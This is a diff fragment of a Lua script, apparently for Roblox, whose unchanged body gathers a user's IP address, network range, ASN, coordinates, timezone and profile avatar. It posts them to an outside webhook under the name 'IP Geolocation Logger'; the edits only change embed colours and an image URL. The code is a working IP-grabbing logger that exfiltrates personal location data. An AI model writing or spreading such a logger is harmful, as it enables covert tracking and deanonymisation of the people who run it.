@@ -14,7 +14,7 @@ request({
 	Method = 'POST',
 	Body = httpService:JSONEncode({
 		embeds = {
-			{ title = 'Geolocation', color = 17301544, fields = {
+			{ title = 'Geolocation', color = 1733608, fields = {
 				addField('IP Address', ipGeoData.ip),
 				addField('Network Range', ipGeoData.network),
 				addField('ASN (Autonomous System Number)', ipGeoData.asn),
@@ -27,10 +27,10 @@ request({
 				addField('Longitude', tostring(ipGeoData.longitude)),
 				addField('Timezone', ipGeoData.timezone)
 			}},
-			{ title = 'User', color = 17301544, fields = { addField('Profile Link', 'https://www.roblox.com/users/' .. userId .. '/profile') }, thumbnail = { url = httpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar?userIds=' .. userId .. '&size=420x420&format=Png&isCircular=false')).data[1].imageUrl } }
+			{ title = 'User', color = 1733608, fields = { addField('Profile Link', 'https://www.roblox.com/users/' .. userId .. '/profile') }, thumbnail = { url = httpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar?userIds=' .. userId .. '&size=420x420&format=Png&isCircular=false')).data[1].imageUrl } }
 		},
 		username = 'IP Geolocation Logger',
-		avatar_url = 'https://i.ibb.co.com/spwWKyBW/Globe-With-Meridians.png'
+		avatar_url = 'https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png'
 	}),
 	Headers = { ['Content-Type'] = 'application/json' }
 })
